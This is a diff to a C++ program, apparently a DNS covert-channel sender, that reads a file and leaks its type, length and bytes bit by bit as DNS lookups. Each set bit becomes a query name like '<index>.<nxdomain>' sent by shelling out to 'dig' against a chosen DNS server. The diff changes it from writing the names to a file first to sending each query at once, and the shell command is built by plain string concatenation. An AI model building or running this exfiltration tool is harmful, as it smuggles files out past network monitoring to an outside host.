@@ -16,9 +16,21 @@ using namespace std;
 #define DEBUG_COUT(x) do {} while(0)
 #endif
 
-bool embed_message(string filename, string nxdomain){
+bool transmit(string query_domain, string dns_server){
+    string cmd;
+    cmd = "dig +noall +tcp @" + dns_server + " " + query_domain;
+    DEBUG_COUT(cout << "Executing command: " << cmd << endl;);
+    int ret = system(cmd.c_str());
+    if (ret == -1) {
+        cerr << "Failed to execute command: " << cmd << endl;
+        return false;
+    }
+    return true;
+}
+
+bool send_message(string filename, string nxdomain, string dns_server){
     // Read input file 
-	ifstream input_file(filename, ios::binary);
+    ifstream input_file(filename, ios::binary);
 	
     // Check if file opened successfully, if not, print error message and return 1
     if (!input_file.is_open()) {
@@ -34,13 +46,6 @@ bool embed_message(string filename, string nxdomain){
     // Initialize type(8-bit) and length(24-bit)
     uint8_t type[1] = {0};
     uint8_t length[3] = {0};
-
-#ifdef DEBUG    // Show default type and length
-    cout << "Default Type: " << bitset<8>(type[0]) << endl;
-    cout << "Default Length: " << bitset<8>(length[0]) << " " 
-                               << bitset<8>(length[1]) << " " 
-                               << bitset<8>(length[2]) << endl;
-#endif
 
     // Get type, using extension_map.h function "getTypeValue"
     type[0] = getTypeValue(filename);
@@ -63,20 +68,19 @@ bool embed_message(string filename, string nxdomain){
     char* value = new char[size];
     input_file.read(value, size); 
     input_file.close();
-	
-    // Initialize output file
-    ofstream out("s_domain.txt");
 
-    // Step1: Insert type (8-bit) to output file
+
+    // Step1: Send type (8-bit) 
     bitset<8> b_type(type[0]);
     for (size_t i = 0; i < b_type.size(); i++) {
         DEBUG_COUT(cout << "b_type[" << i << "]: " << b_type[i] << endl;);
         if (b_type[i] == 1) {
-            out << i << "." << nxdomain << endl;
+            string query_domain = to_string(i) + "." + nxdomain;         
+            transmit(query_domain, dns_server);
         }
     }
 
-    // Step2: Insert length (24-bit) to output file
+    // Step2: Send length (24-bit) 
     for (size_t i = 0; i < 3; i++) {
         bitset<8> b_length(length[i]);
         DEBUG_COUT(cout << "===================\n" 
@@ -85,12 +89,14 @@ bool embed_message(string filename, string nxdomain){
         for (size_t j = 0; j < b_length.size(); j++) {
             DEBUG_COUT(cout << "b_length[" << 8+i*8+j << "]: " << b_length[j] << endl;);
             if (b_length[j] == 1) {
-                out << 8 + i*8+j << "." << nxdomain << endl;
+                int index = 8 + i*8 + j;
+                string query_domain = to_string(index) + "." + nxdomain;
+                transmit(query_domain, dns_server);
             }
         }
     }
 
-    // Step3: Insert value to output file
+    // Step3: Send value
     for (size_t i = 0; i < size; i++) {
         bitset<8> bits(value[i]);
         DEBUG_COUT(cout << "===================\n"
@@ -99,38 +105,18 @@ bool embed_message(string filename, string nxdomain){
         for (size_t j = 0; j < bits.size(); j++) {
             DEBUG_COUT(cout << "bits[" << 32 + i*8+j << "]: " << bits[j] << endl;);
             if (bits[j] == 1) {
-                out << 32 + i*8+j << "." << nxdomain << endl;
+                int index = 32 + i*8 + j;
+                string query_domain = to_string(index) + "." + nxdomain;
+                transmit(query_domain, dns_server);
             }
         }
     }
        
-    // Close output file and free memory
-    out.close(); 
+    // free memory
     delete[] value;
     return true;
 }
 
-bool transmit(string dns_server){
-    ifstream input_file("s_domain.txt");
-    if (!input_file.is_open()) {
-        cerr << "Unable to open s_domain.txt" << endl;
-        return false;
-    }
-
-    string line;
-    string cmd;
-    while (getline(input_file, line)) {
-        cmd = "dig +noall +tcp @" + dns_server + " " + line;
-        DEBUG_COUT(cout << "Executing command: " << cmd << endl;);
-        int ret = system(cmd.c_str());
-        if (ret == -1) {
-            cerr << "Failed to execute command: " << cmd << endl;
-            input_file.close();
-            return false;
-        }
-    }
-    return true;
-}
 
 int main(int argc, char** argv){
     // Check command line arguments
@@ -139,28 +125,18 @@ int main(int argc, char** argv){
         return 1;
     }
 
-    // Check embed_message() function and measure embed_message
-    auto start1 = chrono::high_resolution_clock::now();
-    if(!embed_message(argv[1], argv[2])){
-        cerr << "embed_message() failed.\n";
+    // ------ start measure ------
+    auto start = chrono::high_resolution_clock::now();
+    if(!send_message(argv[1], argv[2], argv[3])){
+        cerr << "send message() failed.\n";
         return 1;
     }
-    auto end1 = chrono::high_resolution_clock::now();
-    auto embed_time = chrono::duration_cast<chrono::milliseconds>(end1 - start1).count();
-    cout << "embed_message runtime: " << embed_time << " ms\n";
 
-    // Check transmit() function and measure transmit
-    auto start2 = chrono::high_resolution_clock::now();
-    if(!transmit(argv[3])){
-        cerr << "transmit() failed.\n";
-        return 1;
-    }
-    auto end2 = chrono::high_resolution_clock::now();
-    auto transmit_time = chrono::duration_cast<chrono::milliseconds>(end2 - start2).count();
-    cout << "transmit runtime: " << transmit_time << " ms\n";
+    // ------- end measure ------
+    auto end = chrono::high_resolution_clock::now();
 
     // ------- total time -------
-    auto total_time = embed_time + transmit_time;
+    auto total_time = chrono::duration_cast<chrono::milliseconds>(end - start).count();
     cout << "total runtime: " << total_time << " ms\n";
 
     return 0;
